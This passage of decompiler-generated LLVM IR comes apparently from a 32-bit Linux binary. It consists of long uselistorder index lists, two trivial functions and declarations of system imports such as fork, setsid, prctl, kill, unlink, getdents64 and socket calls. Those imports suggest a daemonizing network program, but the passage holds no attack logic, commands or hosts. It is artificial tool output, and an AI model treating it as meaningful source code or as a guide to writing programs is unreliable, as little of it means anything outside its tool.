261, 257, 263, 265, 264, 266, 781, 782, 351, 350, 349 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_15f00() local_unnamed_addr {
dec_label_pc_15f00:
  %v5_15f04 = load i32, i32* @r0, align 4
  ret i32 %v5_15f04

; uselistorder directives
  uselistorder i32* @r0, { 4, 11, 12, 96, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 59, 60, 62, 61, 26, 202, 203, 33, 34, 35, 36, 17, 3, 21, 22, 118, 119, 27, 204, 205, 49, 207, 9, 10, 121, 13, 120, 98, 31, 99, 23, 111, 122, 206, 41, 6, 63, 64, 65, 66, 29, 18, 67, 68, 69, 70, 19, 208, 7, 20, 123, 14, 124, 16, 125, 126, 8, 127, 128, 129, 130, 0, 37, 100, 101, 38, 39, 40, 102, 104, 105, 106, 107, 110, 103, 47, 48, 84, 42, 43, 44, 45, 46, 5, 50, 51, 52, 53, 54, 55, 28, 56, 57, 58, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 30, 83, 108, 109, 1, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 97, 112, 113, 114, 115, 116, 131, 117, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 15, 2, 24, 25, 32 }
}

define i32 @function_15f08() local_unnamed_addr {
entry:
  %v3_15f0c = load i32, i32* @r4, align 4
  %v0_15f14 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_15f0c)
  ret i32 %v0_15f14

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 9, 14, 15, 11, 12, 13, 16, 6, 7, 8, 2, 3, 4, 5, 1, 10 }
  uselistorder i32 0, { 145, 0, 963, 964, 965, 966, 147, 146, 967, 1437, 1438, 1439, 1440, 1441, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1442, 1443, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 38, 1462, 1463, 1464, 1465, 1466, 39, 1467, 1468, 1469, 40, 1470, 1471, 1472, 41, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1488, 1489, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 42, 1508, 1509, 1510, 1511, 1512, 43, 1513, 1514, 1515, 1516, 1517, 44, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 781, 782, 323, 783, 324, 971, 1067, 1068, 1069, 1070, 1071, 784, 785, 1531, 1532, 1533, 1534, 325, 786, 1, 787, 788, 789, 1535, 1536, 1537, 148, 1538, 98, 1539, 96, 97, 1540, 1541, 1542, 326, 1546, 327, 1559, 1561, 629, 259, 1562, 328, 1560, 329, 330, 2, 1543, 1544, 149, 1072, 280, 1073, 333, 282, 281, 1074, 1075, 1076, 1077, 332, 1079, 1080, 331, 1081, 1545, 759, 760, 761, 762, 763, 764, 151, 115, 765, 99, 150, 152, 335, 1547, 336, 283, 1548, 1551, 1553, 1554, 334, 1084, 1086, 1087, 74, 260, 1088, 1085, 1082, 1083, 3, 972, 975, 973, 974, 261, 4, 1091, 1089, 1090, 262, 153, 976, 977, 978, 979, 1043, 1044, 337, 5, 1045, 6, 1098, 1099, 154, 1092, 1093, 1094, 1095, 1096, 1097, 7, 8, 1078, 714, 715, 716, 338, 9, 339, 1100, 1101, 623, 980, 624, 1102, 981, 1103, 766, 1104, 982, 1105, 877, 717, 968, 1563, 1564, 88, 790, 340, 791, 792, 793, 794, 341, 795, 796, 797, 798, 799, 800, 801, 718, 767, 1106, 1552, 719, 1107, 802, 820, 720, 625, 1555, 102, 1556, 1549, 721, 1059, 1550, 1060, 1108, 722, 1557, 1558, 10, 1109, 116, 1110, 1111, 256, 255, 630, 103, 104, 105, 106, 656, 631, 76, 75, 117, 1112, 1113, 1114, 1115, 1117, 1116, 11, 1118, 1119, 258, 257, 632, 107, 108, 109, 110, 657, 633, 78, 77, 73, 85, 1120, 658, 1121, 1122, 1123, 111, 1124, 1125, 1126, 1127, 1128, 155, 634, 659, 635, 636, 1129, 660, 125, 156, 1130, 1131, 112, 1132, 1133, 12, 661, 263, 14, 13, 157, 1134, 158, 662, 15, 264, 159, 160, 314, 79, 161, 342, 983, 100, 803, 804, 1136, 1135, 1137, 1138, 45, 162, 1139, 165, 164, 163, 315, 316, 317, 167, 166, 168, 343, 1140, 1141, 169, 1046, 1047, 126, 170, 1142, 171, 686, 172, 1143, 1144, 173, 1145, 1146, 689, 637, 984, 118, 985, 986, 690, 691, 687, 663, 350, 688, 710, 711, 692, 693, 174, 175, 694, 695, 696, 697, 664, 348, 698, 699, 665, 349, 700, 701, 666, 347, 702, 703, 667, 346, 704, 705, 668, 345, 706, 713, 669, 344, 707, 712, 708, 93, 80, 127, 128, 709, 628, 987, 351, 988, 266, 989, 352, 990, 993, 994, 177, 265, 991, 992, 353, 354, 995, 996, 284, 997, 998, 670, 89, 355, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 277, 276, 1007, 356, 1008, 113, 1009, 1010, 129, 1011, 655, 1012, 1013, 1014, 654, 1015, 1016, 1017, 176, 357, 358, 1018, 1021, 1022, 1023, 1024, 1025, 178, 1019, 179, 1020, 16, 180, 999, 739, 740, 741, 95, 81, 742, 94, 82, 743, 744, 745, 746, 747, 748, 359, 749, 750, 752, 181, 751, 90, 753, 18, 17, 754, 821, 822, 825, 826, 823, 824, 827, 828, 723, 361, 725, 182, 726, 727, 728, 729, 730, 731, 732, 733, 184, 183, 734, 91, 362, 735, 724, 365, 366, 19, 736, 737, 185, 738, 71, 72, 367, 368, 363, 360, 364, 755, 756, 757, 758, 369, 318, 189, 188, 671, 319, 191, 190, 672, 320, 193, 192, 673, 321, 195, 194, 674, 675, 322, 187, 186, 268, 275, 269, 270, 271, 370, 768, 196, 197, 777, 769, 770, 771, 772, 773, 774, 775, 776, 267, 778, 779, 83, 780, 198, 199, 371, 101, 805, 806, 807, 808, 274, 809, 810, 811, 273, 812, 813, 814, 815, 121, 816, 818, 817, 119, 120, 200, 272, 373, 374, 372, 819, 287, 285, 286, 122, 201, 86, 202, 829, 133, 132, 130, 131, 830, 831, 87, 832, 833, 834, 835, 836, 203, 837, 838, 375, 839, 840, 841, 842, 207, 204, 205, 206, 843, 844, 845, 846, 376, 847, 848, 290, 849, 289, 850, 288, 851, 377, 852, 853, 854, 136, 134, 135, 20, 855, 856, 857, 858, 208, 859, 860, 292, 291, 861, 378, 862, 863, 864, 865, 866, 140, 137, 138, 139, 21, 867, 868, 869, 209, 870, 210, 871, 872, 295, 873, 294, 874, 293, 875, 379, 876, 215, 381, 213, 214, 211, 212, 878, 217, 216, 879, 218, 380, 881, 882, 144, 141, 142, 143, 22, 880, 883, 884, 885, 886, 887, 888, 23, 24, 25, 26, 27, 889, 890, 382, 297, 891, 383, 892, 384, 893, 385, 894, 386, 895, 387, 896, 388, 897, 296, 898, 219, 220, 221, 900, 901, 899, 903, 904, 902, 28, 29, 30, 31, 32, 905, 222, 906, 907, 299, 908, 389, 909, 390, 910, 391, 911, 392, 912, 393, 913, 394, 914, 298, 915, 395, 916, 224, 223, 225, 918, 919, 917, 920, 921, 84, 923, 924, 925, 926, 396, 927, 33, 34, 35, 36, 37, 922, 226, 123, 928, 929, 304, 930, 303, 931, 302, 932, 300, 933, 301, 934, 397, 935, 398, 936, 227, 230, 229, 228, 939, 940, 938, 937, 399, 942, 941, 943, 231, 944, 945, 307, 946, 306, 947, 305, 948, 400, 949, 232, 235, 234, 233, 952, 953, 951, 950, 955, 954, 956, 957, 236, 310, 958, 309, 959, 308, 960, 401, 961, 278, 962, 1147, 237, 1148, 969, 238, 970, 1026, 1027, 1028, 1029, 1030, 1031, 239, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 240, 241, 1040, 1041, 1042, 1048, 242, 1049, 1050, 1051, 243, 402, 1052, 1053, 46, 1054, 1055, 1056, 1057, 1058, 403, 1061, 244, 1149, 1062, 1063, 1064, 1065, 1150, 1151, 1066, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 404, 1165, 638, 639, 640, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 47, 1207, 1208, 1209, 245, 246, 1210, 405, 1211, 1212, 1213, 1214, 641, 676, 1215, 1216, 1217, 48, 1218, 1219, 1220, 1221, 49, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 50, 1229, 1230, 251, 1231, 1232, 1233, 1234, 1235, 1236, 51, 1237, 1238, 1239, 52, 1240, 1241, 1242, 53, 1243, 1244, 1245, 1246, 408, 1260, 1261, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 642, 677, 1256, 1257, 1258, 1259, 643, 678, 1262, 1263, 1264, 54, 1265, 1266, 409, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 644, 679, 1275, 1276, 1277, 55, 1278, 1279, 1280, 1281, 56, 1282, 645, 1283, 1284, 1287, 1288, 646, 247, 1285, 1286, 248, 249, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 647, 680, 1300, 1301, 1302, 57, 1303, 1304, 1305, 1306, 1307, 1308, 58, 1309, 124, 1310, 1311, 1312, 1313, 648, 681, 1314, 1315, 1316, 59, 1317, 250, 1318, 1319, 1320, 60, 1321, 1322, 1323, 1324, 1325, 649, 682, 1326, 1327, 1328, 61, 1329, 1330, 1331, 62, 406, 407, 1332, 1333, 1334, 1335, 1336, 650, 683, 1337, 1338, 1339, 63, 1340, 1341, 1342, 64, 1343, 1344, 1345, 65, 1346, 1347, 1348, 66, 1349, 1350, 1351, 1352, 67, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1365, 1366, 651, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 279, 1378, 1381, 1382, 1385, 1386, 1387, 68, 1383, 1384, 1379, 1380, 1388, 1389, 253, 252, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 69, 254, 1400, 1401, 1402, 70, 1403, 1404, 1405, 1406, 1408, 92, 410, 1409, 1407, 1363, 1364, 114, 626, 627, 1410, 1411, 1412, 652, 653, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 311, 1433, 312, 1434, 313, 1435, 1436, 684, 685, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579 }
  uselistorder i32* @r4, {}
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
